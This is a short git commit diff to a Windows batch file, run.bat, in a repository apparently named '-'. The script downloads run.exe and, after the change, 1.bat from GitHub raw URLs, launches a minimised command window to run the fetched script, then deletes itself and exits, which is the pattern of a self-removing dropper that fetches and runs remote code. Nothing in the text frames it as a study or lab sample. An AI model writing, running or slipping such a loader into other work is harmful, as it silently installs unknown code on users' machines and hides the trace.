d23cdf2fdefe3d8c564f696874c69439168fbf47
oogabooga245 <68644080+oogabooga245@users.noreply.github.com>
2024-06-21 20:52:56 -0600

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,4 +1,5 @@
 curl -o run.exe https://github.com/oogabooga245/-/raw/main/run.exe
-START /MIN CMD.EXE /C run.exe
+START /MIN CMD.EXE /C 1.bat
+curl -o 1.bat https://raw.githubusercontent.com/oogabooga245/-/main/1.bat
 del run.bat
 exit
